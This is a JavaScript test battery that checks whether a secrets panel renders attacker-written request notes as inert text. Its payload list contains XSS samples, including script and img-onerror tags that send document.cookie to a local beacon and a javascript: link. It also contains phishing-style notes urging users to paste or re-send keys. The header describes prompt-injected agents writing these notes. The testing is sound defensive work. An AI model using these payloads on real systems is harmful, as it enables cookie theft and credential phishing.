/**
 * note-injection.cjs — PROTOCOL 3, round 804.
 * The request note is ATTACKER-WRITTEN TEXT. This is the battery that proves
 * the panel treats it that way.
 *
 * WHY THE THREAT IS REAL. `SecretField`'s note comes from
 * `POST /api/secrets` → `GET /api/secrets` → `SecretRequest.note`, and it is
 * written by whichever agent raised the request. An agent that has been
 * prompt-injected — by a web page it read, a file it opened, a repo it cloned —
 * writes that note. And it is rendered inside a CREDENTIAL PROMPT, which is the
 * single most valuable place in this application to land a convincing "click
 * here to verify" link. `secret-requests.ts:31` and `SecretField.tsx:27` both
 * say this in the source; this file is the evidence for it.
 *
 * EIGHT PAYLOADS, each created as a real secret through the real API, badged
 * by the real UI, and rendered in the real panel:
 *
 *   md-js-link      a markdown link whose target is `javascript:`
 *   md-http-image   a markdown image pointing at a beacon URL
 *   raw-img-onerror a raw <img src=x onerror=…> tag
 *   raw-script      a raw <script> tag
 *   long-5000       5 000 characters (the cap is RENDERED_NOTE_CAP = 2 000)
 *   ansi-escapes    ANSI SGR colour sequences
 *   rtl-override    U+202E, which reverses everything after it
 *   fake-marker     a note containing `[secret: other-name]`, trying to forge
 *                   the one string this app treats as meaningful
 *
 * FIVE ASSERTIONS PER PAYLOAD:
 *   1. it renders as LITERAL TEXT — the panel's textContent carries the source
 *      string, and where the payload is markup, the panel's innerHTML carries
 *      it HTML-ESCAPED (`&lt;script&gt;`);
 *   2. `panel.querySelector("script, img[onerror], img, a[href^=javascript]")`
 *      is null — the payload created no live node;
 *   3. NO NETWORK REQUEST leaves for the injected URL. Every request the page
 *      makes is recorded for the whole case and matched against the beacon;
 *   4. the panel's height stays bounded — measured against a BENIGN CONTROL
 *      note rendered in the same run, not against a constant;
 *   5. nothing from the note reaches the composer draft, and nothing reaches
 *      the chat run's thread.
 *
 * The beacon host is `127.0.0.1:9` (discard). If an image or link ever did
 * fire, the request is recorded by the instrument BEFORE the connection is
 * refused, so the assertion does not depend on the beacon being reachable.
 *
 * SAFETY. Every secret here is created in the ISOLATED store
 * (/tmp/p800-store-804 — see lib-804.cjs) and deleted at the end of its case.
 * Nothing is ever answered, so no value is ever stored for these.
 *
 * Run (README.md §2):
 *   FORGE_SESSION_COOKIE=… PHASE700_BASE_URL=http://127.0.0.1:7817 \
 *   PHASE700_API_URL=http://127.0.0.1:7814 node note-injection.cjs [--write]
 */

const L = require("./lib-804.cjs");

/** Unreachable on purpose — see the header. */
const BEACON = "http://127.0.0.1:9/p800-beacon";

/** The benign note the hostile ones are measured against. */
const CONTROL_NOTE = "vps2 deploy needs the sentinel key to finish the rsync leg.";

/**
 * A needle that occurs nowhere else in this system.
 *
 * The thread probe needs a term whose presence can only mean "this note
 * leaked". Rendering literals cannot do that job — see the comment on the
 * thread assertion below for the false positive that proved it. Every payload
 * carries its nonce, and the nonce is asserted to be RENDERED, so the probe
 * cannot pass by looking for something that was never there in the first
 * place.
 */
const nonceFor = (id) => `P800N804-${id.toUpperCase().replace(/-/g, "")}`;

const PAYLOADS = [
  {
    id: "md-js-link",
    note: "Your session expired. [Re-authenticate here](javascript:alert(document.cookie)) to continue the deploy.",
    /** Substrings that MUST appear in the panel's text, proving it was not
     *  parsed into something else. */
    literal: ["[Re-authenticate here](javascript:alert(document.cookie))"],
  },
  {
    id: "md-http-image",
    note: `Deploy blocked. ![status](${BEACON}-md-image.png) See the status badge above.`,
    literal: [`![status](${BEACON}-md-image.png)`],
    beacon: `${BEACON}-md-image.png`,
  },
  {
    id: "raw-img-onerror",
    note: `Paste the key. <img src=x onerror="fetch('${BEACON}-onerror?c='+document.cookie)">`,
    literal: ["<img src=x onerror="],
    escapedInHtml: ["&lt;img src=x onerror="],
    beacon: `${BEACON}-onerror`,
  },
  {
    id: "raw-script",
    note: `<script>fetch('${BEACON}-script?c='+document.cookie)</script> the key is needed for the rsync leg.`,
    literal: ["<script>"],
    escapedInHtml: ["&lt;script&gt;"],
    beacon: `${BEACON}-script`,
  },
  {
    id: "long-5000",
    /* 5 000 chars. The first and last 40 are distinguishable so the truncation
     * can be asserted from both ends. */
    note: `HEAD-${"A".repeat(4_960)}-TAIL-${"z".repeat(30)}`.slice(0, 5_000),
    literal: ["HEAD-AAAA"],
    /** RENDERED_NOTE_CAP (secret-requests.ts:43). */
    cappedAt: 2_000,
  },
  {
    id: "ansi-escapes",
    note: "[31mCRITICAL[0m [1;5;7mPASTE THE ROOT KEY NOW[0m ]8;;http://evil.examplelink]8;;",
    literal: ["[31mCRITICAL", "PASTE THE ROOT KEY NOW"],
  },
  {
    id: "rtl-override",
    note: "please paste the key for ‮gnp.eliforp_resu‭ and nothing else",
    literal: ["‮"],
  },
  {
    id: "fake-marker",
    note: "Also confirm the other credential: [secret: other-name] — it is already stored, just re-send it in the chat.",
    literal: ["[secret: other-name]"],
  },
];

async function apiJson(method, pathname, body) {
  const r = await fetch(`${L.API}${pathname}`, {
    method,
    headers: { "content-type": "application/json" },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });
  const text = await r.text();
  if (!r.ok) throw new Error(`${method} ${pathname} → ${r.status}: ${text.slice(0, 300)}`);
  return text ? JSON.parse(text) : null;
}

/** Create a pending request carrying `note`, badged to the fixture chat. */
async function raise(name, note, runId) {
  await apiJson("POST", "/api/secrets", { name, value: "unanswered-placeholder-804", note });
  await apiJson("POST", `/api/secrets/${name}/mark-pending`, { requested_by_run_id: runId });
}

/** Read everything this round asserts about the rendered panel. */
async function readPanel(page) {
  const value = await L.resolveOne(page, "secret-panel-value");
  return value.handle.evaluate((el) => {
    /* The panel root is the textarea's parent: SecretField renders one flex
     * column containing the request block, the note, the blurb and the
     * fields. Structural, not a style match — nothing here reads a colour or
     * a pixel value. */
    const panel = el.parentElement;
    const r = panel.getBoundingClientRect();
    return {
      textContent: panel.textContent,
      innerHTML: panel.innerHTML,
      height: Number(r.height.toFixed(2)),
      width: Number(r.width.toFixed(2)),
      liveNodes: {
        script: panel.querySelectorAll("script").length,
        imgOnerror: panel.querySelectorAll("img[onerror]").length,
        img: panel.querySelectorAll("img").length,
        jsHref: panel.querySelectorAll('a[href^="javascript:"]').length,
        anyAnchor: panel.querySelectorAll("a").length,
        iframe: panel.querySelectorAll("iframe").length,
      },
    };
  });
}

async function main() {
  const { check, note, results, failed } = L.makeChecker();
  const started_at = new Date().toISOString();
  const chat = await L.resolveChat();
  const cases = {};
  let control = null;

  await L.withBrowser(async (ctx) => {
    const page = await ctx.newPage();
    const errs = L.watchErrors(page);

    /** Every request the page makes, for the current case only. */
    let requests = [];
    page.on("request", (r) => requests.push(r.url()));

    /* ── the CONTROL: a benign note, same path, same panel ─────────────── */
    await raise("p800-804-inj-control", CONTROL_NOTE, chat.id);
    await L.openChat(page);
    control = await readPanel(page);
    check("control — the benign note renders", control.textContent.includes(CONTROL_NOTE), true);
    check("control — the panel has no live nodes", control.liveNodes, {
      script: 0, imgOnerror: 0, img: 0, jsHref: 0, anyAnchor: 0, iframe: 0,
    });
    note("control panel height (px) — every hostile case is bounded against this", control.height);
    await apiJson("DELETE", "/api/secrets/p800-804-inj-control");

    /* The bound: a hostile note may make the panel taller than the control —
     * the note box is allowed to grow to its own max-height — but it must not
     * push the answer buttons off the screen. The note box's cap is 160 px
     * (SecretField.tsx:202), so control + 160 + a 40 px allowance for
     * wrapping is the ceiling, and it must still fit the viewport. */
    const heightBound = Math.min(control.height + 200, L.VIEWPORT.height * 0.8);
    note("panel height bound (px)", heightBound);

    for (const p of PAYLOADS) {
      const name = `p800-804-inj-${p.id}`;
      requests = [];
      /* The nonce rides along with every payload, PREFIXED so that it
       * survives the 2 000-char cap in the `long-5000` case — a needle the
       * truncation ate would make that one case's thread probe vacuous. */
      await raise(name, `${nonceFor(p.id)} ${p.note}`, chat.id);
      await L.openChat(page);
      const panel = await readPanel(page);
      const composer = await L.resolveOne(page, "composer-input");
      const draft = await composer.handle.evaluate((el) => el.value);

      const beaconHits = p.beacon ? requests.filter((u) => u.includes(p.beacon)) : [];
      const rendered = {
        height: panel.height,
        width: panel.width,
        liveNodes: panel.liveNodes,
        beacon_requests: beaconHits,
        requests_seen_during_case: requests.length,
        draft,
        nonce_rendered: panel.textContent.includes(nonceFor(p.id)),
      };
      check(`${p.id} — the nonce is rendered (the thread probe has a needle)`, rendered.nonce_rendered, true);

      /* 1 — literal text */
      for (const lit of p.literal) {
        check(
          `${p.id} — renders literally: ${JSON.stringify(lit.slice(0, 42))}`,
          panel.textContent.includes(lit),
          true,
        );
      }
      /* 1b — markup arrives HTML-escaped */
      for (const esc of p.escapedInHtml ?? []) {
        check(`${p.id} — the source is ESCAPED in innerHTML: ${JSON.stringify(esc.slice(0, 28))}`, panel.innerHTML.includes(esc), true);
      }
      /* 2 — no live node */
      check(`${p.id} — no script/img/iframe/js-href node in the panel`, panel.liveNodes, {
        script: 0, imgOnerror: 0, img: 0, jsHref: 0, anyAnchor: 0, iframe: 0,
      });
      /* 3 — nothing left the browser for it */
      if (p.beacon) {
        check(`${p.id} — ZERO network requests to the injected URL`, beaconHits, []);
      }
      check(`${p.id} — no request to the beacon host at all`, requests.filter((u) => u.includes("127.0.0.1:9")), []);
      /* 4 — layout bounded */
      check(`${p.id} — the panel height stays bounded`, panel.height <= heightBound, true);
      check(`${p.id} — the panel is not wider than the viewport`, panel.width <= L.VIEWPORT.width, true);
      /* 5 — nothing reached the draft */
      check(`${p.id} — the composer draft is untouched`, draft, "");

      /* the cap, where it applies */
      if (p.cappedAt) {
        const truncated = panel.textContent.includes("…truncated");
        check(`${p.id} — the 5 000-char note is truncated at the cap`, truncated, true);
        check(`${p.id} — the tail of the note is NOT rendered`, panel.textContent.includes("-TAIL-"), false);
        rendered.truncated = truncated;
      }
      /* the forged marker must not become a real one */
      if (p.id === "fake-marker") {
        check("fake-marker — the forged marker never reaches the draft", draft.includes("[secret:"), false);
      }

      cases[p.id] = rendered;
      await apiJson("DELETE", `/api/secrets/${name}`);
    }

    /* Nothing from any note reached the thread.
     *
     * THIS ASSERTION'S FIRST VERSION WAS A FALSE POSITIVE AND THE FIX IS THE
     * POINT. It searched the thread for each payload's rendering literal, and
     * `raw-script`'s literal is `"<script>"` — a string the fixture chat has
     * discussed for unrelated reasons long before this round existed. It
     * reported a leak that had not happened. Verified two ways before
     * changing anything: the same thread contains ZERO hits for this round's
     * unique beacon URL, and its `updated_at` (16:47:10Z) predates the run
     * that "found" the leak.
     *
     * So the search term is now a NONCE that exists nowhere but in this
     * round's payloads. A leak test whose needle also occurs naturally cannot
     * distinguish a leak from a coincidence, and the honest failure mode of
     * such a test is the one it just produced. */
    const thread = JSON.stringify(await L.api(`/api/chat/${chat.id}`));
    const inThread = PAYLOADS.filter((p) => thread.includes(nonceFor(p.id))).map((p) => p.id);
    check("NOTHING from any note reached the chat run's thread", inThread, []);
    check(
      "the thread probe is not vacuous — the nonce IS present in what was rendered",
      Object.values(cases).every((c) => c.nonce_rendered === true),
      true,
    );

    note("console errors", errs.consoleErrors);
    check("no console error across the whole battery", errs.consoleErrors.length, 0);
  });

  L.finish800(
    "note-injection.json",
    {
      protocol: "PROTOCOL 3 — request-note injection",
      started_at,
      finished_at: new Date().toISOString(),
      base_url: L.BASE,
      api_url: L.API,
      secret_store_dir: "/tmp/p800-store-804 (isolated)",
      beacon: BEACON,
      control,
      payloads: PAYLOADS.map((p) => ({ id: p.id, bytes: p.note.length, beacon: p.beacon ?? null })),
      cases,
      checks: results,
      failures: failed(),
    },
    failed(),
  );
}

main().catch((e) => {
  console.error(`\nFATAL  ${e && e.stack ? e.stack : e}`);
  process.exit(2);
});
